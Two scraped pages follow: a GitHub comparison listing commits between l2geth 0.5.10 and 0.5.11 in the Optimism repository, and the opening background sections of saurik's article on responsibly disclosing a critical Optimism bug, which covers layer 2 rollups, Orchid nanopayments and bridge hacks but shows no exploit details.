=== Content from github.com_a64e9414_20250114_231553.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fethereum-optimism%2Foptimism%2Fcompare%2F%2540eth-optimism%252Fl2geth%25400.5.10...%2540eth-optimism%252Fl2geth%25400.5.11)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fethereum-optimism%2Foptimism%2Fcompare%2F%2540eth-optimism%252Fl2geth%25400.5.10...%2540eth-optimism%252Fl2geth%25400.5.11)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fcompare%2Fshow&source=header-repo&source_repo=ethereum-optimism%2Foptimism)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ethereum-optimism](/ethereum-optimism)
/
**[optimism](/ethereum-optimism/optimism)**
Public

* [Notifications](/login?return_to=%2Fethereum-optimism%2Foptimism) You must be signed in to change notification settings
* [Fork
  3.4k](/login?return_to=%2Fethereum-optimism%2Foptimism)
* [Star
   5.9k](/login?return_to=%2Fethereum-optimism%2Foptimism)

* [Code](/ethereum-optimism/optimism)
* [Issues
  385](/ethereum-optimism/optimism/issues)
* [Pull requests
  115](/ethereum-optimism/optimism/pulls)
* [Discussions](/ethereum-optimism/optimism/discussions)
* [Projects
  4](/ethereum-optimism/optimism/projects)
* [Security](/ethereum-optimism/optimism/security)
* [Insights](/ethereum-optimism/optimism/pulse)

Additional navigation options

* [Code](/ethereum-optimism/optimism)
* [Issues](/ethereum-optimism/optimism/issues)
* [Pull requests](/ethereum-optimism/optimism/pulls)
* [Discussions](/ethereum-optimism/optimism/discussions)
* [Projects](/ethereum-optimism/optimism/projects)
* [Security](/ethereum-optimism/optimism/security)
* [Insights](/ethereum-optimism/optimism/pulse)

[Permalink](https://github.com/ethereum-optimism/optimism/compare/ethereum-optimism%3A17287cc...ethereum-optimism%3Ad10e319)
# Comparing changes

 Choose two branches to see what’s changed or to start a new pull request.
If you need to, you can also  compare across forks
 or
[learn more about diff comparisons](https://docs.github.com/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests#three-dot-and-two-dot-git-diff-comparisons).

# Open a pull request

 Create a new pull request by comparing changes across two branches. If you need to, you can also  compare across forks
.
[Learn more about diff comparisons here](https://docs.github.com/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests#three-dot-and-two-dot-git-diff-comparisons).

*base repository:*
ethereum-optimism/optimism

Failed to load repositories. Confirm that selected base ref is valid, then try again.

 Loading

*base:*
@eth-optimism/l2geth@0.5.10

Choose a base ref

Branches
Tags

Could not load branches

Nothing to show

 Loading

[{{ refName }}
default](/ethereum-optimism/optimism/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...%40eth-optimism/l2geth%400.5.11)

Could not load tags

Nothing to show

[{{ refName }}
default](/ethereum-optimism/optimism/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...%40eth-optimism/l2geth%400.5.11)

 Loading

...

*head repository:*
ethereum-optimism/optimism

Failed to load repositories. Confirm that selected head ref is valid, then try again.

 Loading

*compare:*
@eth-optimism/l2geth@0.5.11

Choose a head ref

Branches
Tags

Could not load branches

Nothing to show

 Loading

[{{ refName }}
default](/ethereum-optimism/optimism/compare/%40eth-optimism/l2geth%400.5.10...%7B%7B%20urlEncodedRefName%20%7D%7D)

Could not load tags

Nothing to show

[{{ refName }}
default](/ethereum-optimism/optimism/compare/%40eth-optimism/l2geth%400.5.10...%7B%7B%20urlEncodedRefName%20%7D%7D)

 Loading

* 19

  commits
* 54

  files changed
* 5

  contributors

### Commits on Feb 4, 2022

1. [chore: remove unused import of Lib\_RLPReader](/ethereum-optimism/optimism/commit/fa5ef7a0e2c559f04b8932348435d724ad94f92d)

   [![@maurelian](https://avatars.githubusercontent.com/u/23033765?s=40&v=4)](/maurelian) [![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&v=4)](/smartcontracts)

   [maurelian](/ethereum-optimism/optimism/commits?author=maurelian "View all commits by maurelian")
   authored and
   [smartcontracts](/ethereum-optimism/optimism/commits?author=smartcontracts "View all commits by smartcontracts")
   committed
   Feb 4, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/fa5ef7a0e2c559f04b8932348435d724ad94f92d)
   * Copy full SHA for fa5ef7a
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/fa5ef7a0e2c559f04b8932348435d724ad94f92d)

   Copy the full SHA

    [fa5ef7a](/ethereum-optimism/optimism/commit/fa5ef7a0e2c559f04b8932348435d724ad94f92d)View commit details

   Browse the repository at this point in the history
2. [chore: Remove unused test helpers](/ethereum-optimism/optimism/commit/438bc78ae0a13e5963bb0bdb21bae9ae1317e834)

   [![@maurelian](https://avatars.githubusercontent.com/u/23033765?s=40&v=4)](/maurelian) [![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&v=4)](/smartcontracts)

   [maurelian](/ethereum-optimism/optimism/commits?author=maurelian "View all commits by maurelian")
   authored and
   [smartcontracts](/ethereum-optimism/optimism/commits?author=smartcontracts "View all commits by smartcontracts")
   committed
   Feb 4, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/438bc78ae0a13e5963bb0bdb21bae9ae1317e834)
   * Copy full SHA for 438bc78
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/438bc78ae0a13e5963bb0bdb21bae9ae1317e834)

   Copy the full SHA

    [438bc78](/ethereum-optimism/optimism/commit/438bc78ae0a13e5963bb0bdb21bae9ae1317e834)View commit details

   Browse the repository at this point in the history
3. [chore: lint docs](/ethereum-optimism/optimism/commit/4710779b735ef91929dd4488805ae4866cad335a)

   [![@maurelian](https://avatars.githubusercontent.com/u/23033765?s=40&v=4)](/maurelian) [![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&v=4)](/smartcontracts)

   [maurelian](/ethereum-optimism/optimism/commits?author=maurelian "View all commits by maurelian")
   authored and
   [smartcontracts](/ethereum-optimism/optimism/commits?author=smartcontracts "View all commits by smartcontracts")
   committed
   Feb 4, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/4710779b735ef91929dd4488805ae4866cad335a)
   * Copy full SHA for 4710779
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/4710779b735ef91929dd4488805ae4866cad335a)

   Copy the full SHA

    [4710779](/ethereum-optimism/optimism/commit/4710779b735ef91929dd4488805ae4866cad335a)View commit details

   Browse the repository at this point in the history
4. [Merge pull request](/ethereum-optimism/optimism/commit/5fea4ec4642e3285f50cd96b51ccaa2110398cfe) [#2138](https://github.com/ethereum-optimism/optimism/pull/2138) [from ethereum-optimism/master](/ethereum-optimism/optimism/commit/5fea4ec4642e3285f50cd96b51ccaa2110398cfe)
    …

   ```
   master => develop
   ```

   [![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&v=4)](/smartcontracts)

   [smartcontracts](/ethereum-optimism/optimism/commits?author=smartcontracts "View all commits by smartcontracts")
   authored
   Feb 4, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/5fea4ec4642e3285f50cd96b51ccaa2110398cfe)
   * Copy full SHA for 5fea4ec
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/5fea4ec4642e3285f50cd96b51ccaa2110398cfe)

   Copy the full SHA

    [5fea4ec](/ethereum-optimism/optimism/commit/5fea4ec4642e3285f50cd96b51ccaa2110398cfe)View commit details

   Browse the repository at this point in the history
5. [fix: correctly export SDK](/ethereum-optimism/optimism/commit/dd9683bbde4163210e79b57308e3b1c9678cc1bb)

   [![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&v=4)](/smartcontracts)

   [smartcontracts](/ethereum-optimism/optimism/commits?author=smartcontracts "View all commits by smartcontracts")
   committed
   Feb 4, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/dd9683bbde4163210e79b57308e3b1c9678cc1bb)
   * Copy full SHA for dd9683b
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/dd9683bbde4163210e79b57308e3b1c9678cc1bb)

   Copy the full SHA

    [dd9683b](/ethereum-optimism/optimism/commit/dd9683bbde4163210e79b57308e3b1c9678cc1bb)View commit details

   Browse the repository at this point in the history
6. [Merge pull request](/ethereum-optimism/optimism/commit/d3feab5e0eff23a327e2592e8f323adbe51ba907) [#2139](https://github.com/ethereum-optimism/optimism/pull/2139) [from ethereum-optimism/sc/sdk-correct-publish](/ethereum-optimism/optimism/commit/d3feab5e0eff23a327e2592e8f323adbe51ba907)
    …

   ```
   fix: correctly export SDK
   ```

   [![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&v=4)](/smartcontracts)

   [smartcontracts](/ethereum-optimism/optimism/commits?author=smartcontracts "View all commits by smartcontracts")
   authored
   Feb 4, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/d3feab5e0eff23a327e2592e8f323adbe51ba907)
   * Copy full SHA for d3feab5
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/d3feab5e0eff23a327e2592e8f323adbe51ba907)

   Copy the full SHA

    [d3feab5](/ethereum-optimism/optimism/commit/d3feab5e0eff23a327e2592e8f323adbe51ba907)View commit details

   Browse the repository at this point in the history
7. [dtl: handle errors in context api](/ethereum-optimism/optimism/commit/8f72064d3ead67041e6537b22c9a90b09681a405)
    …

   ```
   Both `GET /eth/context/latest` and `GET /eth/context/blocknumber/:number`
   rely on fetching a remote block to pull the timestamp, blocknumber and
   blockhash from. If the fetched block is not found, then properties on
   `null` will be attempted to be accessed which will result in a runtime
   error. This commit adds handling for this case to prevent that kind of
   bug.
   ```

   [![@tynes](https://avatars.githubusercontent.com/u/6626818?s=40&v=4)](/tynes)

   [tynes](/ethereum-optimism/optimism/commits?author=tynes "View all commits by tynes")
   committed
   Feb 4, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/8f72064d3ead67041e6537b22c9a90b09681a405)
   * Copy full SHA for 8f72064
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/8f72064d3ead67041e6537b22c9a90b09681a405)

   Copy the full SHA

    [8f72064](/ethereum-optimism/optimism/commit/8f72064d3ead67041e6537b22c9a90b09681a405)View commit details

   Browse the repository at this point in the history
8. [Merge pull request](/ethereum-optimism/optimism/commit/e24218170adf408660f662f2158ef188b4261a8b) [#2140](https://github.com/ethereum-optimism/optimism/pull/2140) [from ethereum-optimism/develop](/ethereum-optimism/optimism/commit/e24218170adf408660f662f2158ef188b4261a8b)
    …

   ```
   develop => master
   ```

   [![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&v=4)](/smartcontracts)

   [smartcontracts](/ethereum-optimism/optimism/commits?author=smartcontracts "View all commits by smartcontracts")
   authored
   Feb 4, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/e24218170adf408660f662f2158ef188b4261a8b)
   * Copy full SHA for e242181
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/e24218170adf408660f662f2158ef188b4261a8b)

   Copy the full SHA

    [e242181](/ethereum-optimism/optimism/commit/e24218170adf408660f662f2158ef188b4261a8b)View commit details

   Browse the repository at this point in the history
9. [Version Packages](/ethereum-optimism/optimism/commit/763af7d91b652114fd4804d4864ef282f3c1faa6)

   [![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)

   [github-actions[bot]](/ethereum-optimism/optimism/commits?author=github-actions%5Bbot%5D "View all commits by github-actions[bot]")
   committed
   Feb 4, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/763af7d91b652114fd4804d4864ef282f3c1faa6)
   * Copy full SHA for 763af7d
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/763af7d91b652114fd4804d4864ef282f3c1faa6)

   Copy the full SHA

    [763af7d](/ethereum-optimism/optimism/commit/763af7d91b652114fd4804d4864ef282f3c1faa6)View commit details

   Browse the repository at this point in the history
10. [Merge pull request](/ethereum-optimism/optimism/commit/21806b6204f7ec7a7cec6b044ecc3047926104af) [#2142](https://github.com/ethereum-optimism/optimism/pull/2142) [from ethereum-optimism/changeset-release/master](/ethereum-optimism/optimism/commit/21806b6204f7ec7a7cec6b044ecc3047926104af)
     …

    ```
    Version Packages
    ```

    [![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&v=4)](/smartcontracts)

    [smartcontracts](/ethereum-optimism/optimism/commits?author=smartcontracts "View all commits by smartcontracts")
    authored
    Feb 4, 2022

    Configuration menu

    * [View commit details](/ethereum-optimism/optimism/commit/21806b6204f7ec7a7cec6b044ecc3047926104af)
    * Copy full SHA for 21806b6
    * [Browse repository at this point](/ethereum-optimism/optimism/tree/21806b6204f7ec7a7cec6b044ecc3047926104af)

    Copy the full SHA

     [21806b6](/ethereum-optimism/optimism/commit/21806b6204f7ec7a7cec6b044ecc3047926104af)View commit details

    Browse the repository at this point in the history
11. [Merge pull request](/ethereum-optimism/optimism/commit/412a12717aec37316d0fc10865ddd3def68c9136) [#2143](https://github.com/ethereum-optimism/optimism/pull/2143) [from ethereum-optimism/develop](/ethereum-optimism/optimism/commit/412a12717aec37316d0fc10865ddd3def68c9136)
     …

    ```
    develop => master
    ```

    [![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&v=4)](/smartcontracts)

    [smartcontracts](/ethereum-optimism/optimism/commits?author=smartcontracts "View all commits by smartcontracts")
    authored
    Feb 4, 2022

    Configuration menu

    * [View commit details](/ethereum-optimism/optimism/commit/412a12717aec37316d0fc10865ddd3def68c9136)
    * Copy full SHA for 412a127
    * [Browse repository at this point](/ethereum-optimism/optimism/tree/412a12717aec37316d0fc10865ddd3def68c9136)

    Copy the full SHA

     [412a127](/ethereum-optimism/optimism/commit/412a12717aec37316d0fc10865ddd3def68c9136)View commit details

    Browse the repository at this point in the history

### Commits on Feb 5, 2022

1. [Merge pull request](/ethereum-optimism/optimism/commit/a22b4ed6e10e021db1f8d909befbf8584db640e7) [#2141](https://github.com/ethereum-optimism/optimism/pull/2141) [from ethereum-optimism/fix/dtl-context-api-e…](/ethereum-optimism/optimism/commit/a22b4ed6e10e021db1f8d909befbf8584db640e7)
    …

   ```
   …rror

   dtl: handle errors in context api
   ```

   [![@tynes](https://avatars.githubusercontent.com/u/6626818?s=40&v=4)](/tynes)

   [tynes](/ethereum-optimism/optimism/commits?author=tynes "View all commits by tynes")
   authored
   Feb 5, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/a22b4ed6e10e021db1f8d909befbf8584db640e7)
   * Copy full SHA for a22b4ed
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/a22b4ed6e10e021db1f8d909befbf8584db640e7)

   Copy the full SHA

    [a22b4ed](/ethereum-optimism/optimism/commit/a22b4ed6e10e021db1f8d909befbf8584db640e7)View commit details

   Browse the repository at this point in the history
2. [Merge pull request](/ethereum-optimism/optimism/commit/855fc76ae187091bd125e16a07a6635d42acd1fc) [#2133](https://github.com/ethereum-optimism/optimism/pull/2133) [from ethereum-optimism/m/cleanup](/ethereum-optimism/optimism/commit/855fc76ae187091bd125e16a07a6635d42acd1fc)
    …

   ```
   Remove some unused code
   ```

   [![@tynes](https://avatars.githubusercontent.com/u/6626818?s=40&v=4)](/tynes)

   [tynes](/ethereum-optimism/optimism/commits?author=tynes "View all commits by tynes")
   authored
   Feb 5, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/855fc76ae187091bd125e16a07a6635d42acd1fc)
   * Copy full SHA for 855fc76
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/855fc76ae187091bd125e16a07a6635d42acd1fc)

   Copy the full SHA

    [855fc76](/ethereum-optimism/optimism/commit/855fc76ae187091bd125e16a07a6635d42acd1fc)View commit details

   Browse the repository at this point in the history

### Commits on Feb 6, 2022

1. [maintenance: decrease geth diff](/ethereum-optimism/optimism/commit/9ef215b830f314739088f2ddb3d140ac30781595)

   [![@smartcontracts](https://avatars.githubusercontent.com/u/14298799?s=40&v=4)](/smartcontracts) [![@mslipper](https://avatars.githubusercontent.com/u/67953?s=40&v=4)](/mslipper)

   [smartcontracts](/ethereum-optimism/optimism/commits?author=smartcontracts "View all commits by smartcontracts")
   authored and
   [mslipper](/ethereum-optimism/optimism/commits?author=mslipper "View all commits by mslipper")
   committed
   Feb 6, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/9ef215b830f314739088f2ddb3d140ac30781595)
   * Copy full SHA for 9ef215b
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/9ef215b830f314739088f2ddb3d140ac30781595)

   Copy the full SHA

    [9ef215b](/ethereum-optimism/optimism/commit/9ef215b830f314739088f2ddb3d140ac30781595)View commit details

   Browse the repository at this point in the history
2. [Merge pull request](/ethereum-optimism/optimism/commit/98cb7ee6940c005d29771996454d2b3b4951350a) [#2146](https://github.com/ethereum-optimism/optimism/pull/2146) [from ethereum-optimism/sc/decrease-geth-diff](/ethereum-optimism/optimism/commit/98cb7ee6940c005d29771996454d2b3b4951350a)
    …

   ```
   maintenance: decrease geth diff
   ```

   [![@mslipper](https://avatars.githubusercontent.com/u/67953?s=40&v=4)](/mslipper)

   [mslipper](/ethereum-optimism/optimism/commits?author=mslipper "View all commits by mslipper")
   authored
   Feb 6, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/98cb7ee6940c005d29771996454d2b3b4951350a)
   * Copy full SHA for 98cb7ee
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/98cb7ee6940c005d29771996454d2b3b4951350a)

   Copy the full SHA

    [98cb7ee](/ethereum-optimism/optimism/commit/98cb7ee6940c005d29771996454d2b3b4951350a)View commit details

   Browse the repository at this point in the history
3. [Merge pull request](/ethereum-optimism/optimism/commit/7971d924303e12a1edaad88a8e9fbcd56b54e531) [#2148](https://github.com/ethereum-optimism/optimism/pull/2148) [from ethereum-optimism/develop](/ethereum-optimism/optimism/commit/7971d924303e12a1edaad88a8e9fbcd56b54e531)
    …

   ```
   Develop -> Master PR
   ```

   [![@mslipper](https://avatars.githubusercontent.com/u/67953?s=40&v=4)](/mslipper)

   [mslipper](/ethereum-optimism/optimism/commits?author=mslipper "View all commits by mslipper")
   authored
   Feb 6, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/7971d924303e12a1edaad88a8e9fbcd56b54e531)
   * Copy full SHA for 7971d92
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/7971d924303e12a1edaad88a8e9fbcd56b54e531)

   Copy the full SHA

    [7971d92](/ethereum-optimism/optimism/commit/7971d924303e12a1edaad88a8e9fbcd56b54e531)View commit details

   Browse the repository at this point in the history
4. [Version Packages](/ethereum-optimism/optimism/commit/a90de7787817bf8275b7e56e8f2e7720a551974f)

   [![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)

   [github-actions[bot]](/ethereum-optimism/optimism/commits?author=github-actions%5Bbot%5D "View all commits by github-actions[bot]")
   committed
   Feb 6, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/a90de7787817bf8275b7e56e8f2e7720a551974f)
   * Copy full SHA for a90de77
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/a90de7787817bf8275b7e56e8f2e7720a551974f)

   Copy the full SHA

    [a90de77](/ethereum-optimism/optimism/commit/a90de7787817bf8275b7e56e8f2e7720a551974f)View commit details

   Browse the repository at this point in the history
5. [Merge pull request](/ethereum-optimism/optimism/commit/fd6f47d3e61b2aa9e9bae1b758b6b6d930300cbc) [#2149](https://github.com/ethereum-optimism/optimism/pull/2149) [from ethereum-optimism/changeset-release/master](/ethereum-optimism/optimism/commit/fd6f47d3e61b2aa9e9bae1b758b6b6d930300cbc)
    …

   ```
   Version Packages
   ```

   [![@mslipper](https://avatars.githubusercontent.com/u/67953?s=40&v=4)](/mslipper)

   [mslipper](/ethereum-optimism/optimism/commits?author=mslipper "View all commits by mslipper")
   authored
   Feb 6, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/fd6f47d3e61b2aa9e9bae1b758b6b6d930300cbc)
   * Copy full SHA for fd6f47d
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/fd6f47d3e61b2aa9e9bae1b758b6b6d930300cbc)

   Copy the full SHA

    [fd6f47d](/ethereum-optimism/optimism/commit/fd6f47d3e61b2aa9e9bae1b758b6b6d930300cbc)View commit details

   Browse the repository at this point in the history
6. [Merge pull request](/ethereum-optimism/optimism/commit/d10e31996aca39bc9529dcbe69a57aa46e6a84e9) [#2150](https://github.com/ethereum-optimism/optimism/pull/2150) [from ethereum-optimism/develop](/ethereum-optimism/optimism/commit/d10e31996aca39bc9529dcbe69a57aa46e6a84e9)
    …

   ```
   Develop -> Master
   ```

   [![@mslipper](https://avatars.githubusercontent.com/u/67953?s=40&v=4)](/mslipper)

   [mslipper](/ethereum-optimism/optimism/commits?author=mslipper "View all commits by mslipper")
   authored
   Feb 6, 2022

   Configuration menu

   * [View commit details](/ethereum-optimism/optimism/commit/d10e31996aca39bc9529dcbe69a57aa46e6a84e9)
   * Copy full SHA for d10e319
   * [Browse repository at this point](/ethereum-optimism/optimism/tree/d10e31996aca39bc9529dcbe69a57aa46e6a84e9)

   Copy the full SHA

    [d10e319](/ethereum-optimism/optimism/commit/d10e31996aca39bc9529dcbe69a57aa46e6a84e9)View commit details

   Browse the repository at this point in the history

 Loading

### This comparison is taking too long to generate.

Unfortunately it looks like we can’t render this comparison for you right now. It might be too big, or there might be something weird with your repository.

You can try running this command locally to see the comparison on your machine:

`git diff @eth-optimism/l2geth@0.5.10...@eth-optimism/l2geth@0.5.11`

  Retry

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.saurik.com_feb28a99_20250114_231559.html ===


## Attacking an Ethereum L2 with Unbridled Optimism

### The Summary

On 2/2/2022, I reported a critical security issue to Optimism—an "L2 scaling solution" for Ethereum—that would allow an attacker to replicate money on any chain using their "OVM 2.0" fork of go-ethereum (which they call l2geth).

Quickly, Optimism—whose platform currently uses a centralized "sequencer"—moved to both fix this bug on their nodes and infrastructure, as well as arrange for downstream projects that used their codebase (Boba and Metis) to get patched.

This article provides the backstory of how and why I found this bug and goes into my usual "extreme" level of detail on how the bug works (something I haven't bothered to do in article form in a while: I've mostly been just giving talks).

I will also be giving a talk at [ETHDenver](https://www.ethdenver.com/) 2022, at 9:40am MST on February 18th, on this vulnerability. If you want to meet me while I'm there, I should be available for much of the event. (I'm also a "mentor", but that seems to be flexible.)

This article slowly transitions from high-level background and discussion into deep, low-level technical detail; but, at the end, I return for some high-level thoughts on the ethics of security research and incentive alignment in the cryptocurrency industry. If you start thinking "this is getting dry", try skipping ahead!

### My Background

I am Jay Freeman, though I am mostly known online as "saurik" for my work on Cydia, an alternative to the App Store for jailbroken iOS devices. While I was a member of key jailbreak teams, I focused on everything "after the hack".

In other past work, I developed multiple jailbreaks for Android (implementing mempodipper and Master Key), wrote the first decompiler for .NET (Exemplar, for my Anakrino GUI), and worked on nmap's programmatic scanning features.

I give a lot of talks at conferences, where I sometimes present "Penn & Teller"-style exposés of exploit stacks. (This means my life for the past two years has been extremely reclusive and unhealthy, as I do not enjoy online conferences.)

I now am one of the remaining founders of [Orchid](https://www.orchid.com/), a project that builds a market for programmable bandwidth, along with [Steven Waterhouse](https://twitter.com/deseventral) (a founding partner of Pantera Capital) and [Brian Fox](https://en.wikipedia.org/wiki/Brian_Fox_%28computer_programmer%29) (developer of bash, readline, etc.).

### Orchid Nanopayments

For Orchid, while I have no official/ratified title, I am "in charge of technology". In particular (as relevant to this article), I have implemented all of Orchid's smart contracts, including the one used for "nanopayments".

(While going into details of Orchid would be a digression, the reason Orchid cares about this is that users incrementally pay for access to the network with tiny payments, the fees for which would otherwise be too high.)

Our nanopayments integration—designed primarily by David Salamon, Justin Sheek, and myself, while leaning on the work done previously by [Ronald L. Rivest at MIT and PepperCoin](https://news.ycombinator.com/item?id=27681940)—amortizes transaction fees for very small transfers.

While, over enough time, our system can amortize even very large transaction fees, there are side effects: the size of the payments goes up and the number of payments goes down, leading to a higher variance of expected vs. actual payment.

It is thereby interesting to Orchid when people create new, cheaper blockchain technology, as Orchid's payments infrastructure is not inherently tied to any single chain, and a lot of my work involves exploring and evaluating new options.

### Layer 2 Scaling

Orchid is, in some sense, what one might call [a "layer 2 scaling solution"](https://academy.binance.com/en/glossary/layer-2): a payments system that runs as an ecosystem on top of another payments system. In our case, we implement what I have sometimes called a "probabilistic rollup".

Our nanopayments system certainly isn't the only layer 2, and—being mostly off-chain with probabilistic settlement—isn't even a prototypical one. That said, it is common for people to quibble over what, exactly, another system can be "considered".

The more commonly cited layer 2 solutions are systems such as [Optimism](https://www.optimism.io/) or [zkSync](https://zksync.io/): each a prototypical example of an "optimistic rollup" and a "zero-knowledge rollup" (respectively). Vitalik (of Ethereum) wrote [an overview of rollups](https://vitalik.ca/general/2021/01/05/rollup.html).

Interestingly, the "2" in layer 2 is sometimes a bit arbitrary: layer 2 solutions that don't involve committing linear amounts of state to the underlying layer 1 can often compose or stack, allowing our nanopayments to run on another layer 2.

### Cross-Chain Bridges

Many of the largest hacks we hear about in crypto happen to "bridges", the contracts and protocols that allow users of one blockchain to work with assets on another blockchain. These are often needed even between an L2 and its L1.

As it is usually actually impossible to be *assured* of "finality"—the property that a transaction has once and truly committed and will never be reversed for any reason—in blockchain consensus systems, these bridges are fraught with inherent peril.

Often, at the end of the day, they end up even relying on trusted third-parties to authorize "withdrawals" (similar to banks, but before you try to claim "omg they re-invented banks": the ability to permissionlessly create a bank is a feature).

The mechanism generally involves depositing money in a locked-up reserve on one side of the bridge and then printing an IOU on the other/remote side that can be traded and later redeemed to unlock some of the previously-deposited money from the reserve.

### All the Bridges Falling Down

When bridges are attacked, generally someone managed to trick the smart contract that is holding the pile of money backing the IOUs to incorrectly release it, meaning IOUs on the other side of the bridge might not be redeemable.

On the same day that I reported the virtual machine bug discussed in this article to Optimism, [a cross-chain bridge called Wormhole](https://wormholenetwork.com/) that connects Ethereum to Solana [was hacked](https://www.theverge.com/2022/2/3/22916111/wormhole-hack-github-error-325-million-theft-ethereum-solana), and someone walked away with ~$325 million worth of Ether.

